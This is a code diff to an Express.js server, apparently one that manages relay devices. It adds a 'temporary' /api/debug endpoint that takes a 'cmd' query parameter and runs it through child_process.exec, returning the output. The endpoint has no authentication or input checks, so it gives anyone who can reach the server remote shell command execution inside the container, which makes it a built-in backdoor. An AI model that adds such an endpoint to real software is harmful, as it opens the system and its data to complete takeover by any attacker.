@@ -39,6 +39,22 @@ app.get('/api/health', async (req, res) => {
   });
 });
 
+/** GET /api/debug — Temporary endpoint to run shell commands in the container */
+app.get('/api/debug', (req, res) => {
+  const cmd = req.query.cmd;
+  if (!cmd) return res.json({ error: 'No cmd provided' });
+  
+  const { exec } = require('child_process');
+  exec(cmd, (error, stdout, stderr) => {
+    res.json({
+      cmd,
+      stdout: stdout || '',
+      stderr: stderr || '',
+      error: error ? error.message : null
+    });
+  });
+});
+
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  ROUTES — Relay Devices (T-Embed units)
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
